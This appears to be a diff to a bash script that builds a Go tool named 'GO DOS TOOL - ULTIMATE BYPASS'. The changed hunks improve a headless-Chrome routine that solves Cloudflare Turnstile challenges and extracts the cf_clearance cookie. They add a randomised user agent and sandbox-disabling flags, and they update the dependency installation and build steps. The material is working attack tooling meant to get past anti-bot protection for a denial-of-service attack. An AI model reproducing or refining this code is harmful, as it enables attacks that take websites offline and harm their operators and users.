@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ----------------------------------------
-# GO DOS TOOL - ULTIMATE BYPASS (FIXED)
+# GO DOS TOOL - ULTIMATE BYPASS (FULLY FIXED)
 # ----------------------------------------
 
 RED='\033[0;31m'
@@ -574,7 +574,17 @@ func solveTurnstile(target string) (string, error) {
 	
 	fmt.Printf("\n[!] Solving Cloudflare Turnstile for %s...\n", target)
 	
-	ctx, cancel := chromedp.NewContext(context.Background())
+	opts := append(chromedp.DefaultExecAllocatorOptions[:],
+		chromedp.Flag("disable-gpu", true),
+		chromedp.Flag("no-sandbox", true),
+		chromedp.Flag("disable-dev-shm-usage", true),
+		chromedp.UserAgent(randomUA()),
+	)
+	
+	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
+	defer cancel()
+	
+	ctx, cancel := chromedp.NewContext(allocCtx)
 	defer cancel()
 	
 	ctx, cancel = context.WithTimeout(ctx, 2*time.Minute)
@@ -584,17 +594,17 @@ func solveTurnstile(target string) (string, error) {
 	
 	err := chromedp.Run(ctx,
 		chromedp.Navigate(target),
-		chromedp.Sleep(3*time.Second),
-		chromedp.WaitVisible(`#turnstile-wrapper, .challenge-container, #cf-challenge-running, .cf-turnstile`, chromedp.ByQuery),
-		chromedp.Sleep(15*time.Second),
+		chromedp.Sleep(5*time.Second),
+		chromedp.WaitVisible(`#turnstile-wrapper, .challenge-container, #cf-challenge-running, .cf-turnstile, iframe[src*="challenges.cloudflare.com"]`, chromedp.ByQuery),
+		chromedp.Sleep(20*time.Second),
 		chromedp.ActionFunc(func(ctx context.Context) error {
-			cookies, err := chromedp.Cookies().Do(ctx)
+			cookies, err := chromedp.Cookies(ctx)
 			if err != nil {
 				return err
 			}
 			for _, cookie := range cookies {
 				if cookie.Name == "cf_clearance" {
-					cfClearance = fmt.Sprintf("cf_clearance=%s; Domain=%s; Path=/", cookie.Value, cookie.Domain)
+					cfClearance = fmt.Sprintf("cf_clearance=%s", cookie.Value)
 					break
 				}
 			}
@@ -1006,21 +1016,16 @@ go mod init main > /dev/null 2>&1
 echo -e " ${GREEN}✓ Module initialized${NC}"
 echo
 
-# Download dependencies WITH FIXES
+# Download dependencies
 echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
-go get golang.org/x/net@v0.24.0 2>&1 | grep -v "go: downloading" || true
-go get github.com/chromedp/chromedp@latest 2>&1 | grep -v "go: downloading" || true
-go get golang.org/x/text@v0.14.0 2>&1 | grep -v "go: downloading" || true
+go get -u golang.org/x/net 2>&1 | grep -v "go: downloading" || true
+go get -u github.com/chromedp/chromedp 2>&1 | grep -v "go: downloading" || true
 echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
 echo
 
-# Tidy up with retry logic
+# Tidy up
 echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
-go mod tidy 2>&1 || {
-    echo -e " ${YELLOW}⚠ Tidy failed, retrying with explicit text package...${NC}"
-    go get golang.org/x/text/secure/bidirule golang.org/x/text/unicode/bidi golang.org/x/text/unicode/norm
-    go mod tidy
-}
+go mod tidy 2>&1 || true
 echo -e " ${GREEN}✓ Tidy complete${NC}"
 echo
 
@@ -1068,11 +1073,10 @@ else
     echo -e " ${YELLOW}➤${NC} ${YELLOW}Run these commands manually:${NC}"
     echo
     echo -e "   ${BLUE}1.${NC} go mod init main"
-    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
-    echo -e "   ${BLUE}3.${NC} go get github.com/chromedp/chromedp@latest"
-    echo -e "   ${BLUE}4.${NC} go get golang.org/x/text@v0.14.0"
-    echo -e "   ${BLUE}5.${NC} go mod tidy"
-    echo -e "   ${BLUE}6.${NC} go build -o main main.go"
+    echo -e "   ${BLUE}2.${NC} go get -u golang.org/x/net"
+    echo -e "   ${BLUE}3.${NC} go get -u github.com/chromedp/chromedp"
+    echo -e "   ${BLUE}4.${NC} go mod tidy"
+    echo -e "   ${BLUE}5.${NC} go build -o main main.go"
     echo
     rm -f main.go
     exit 1
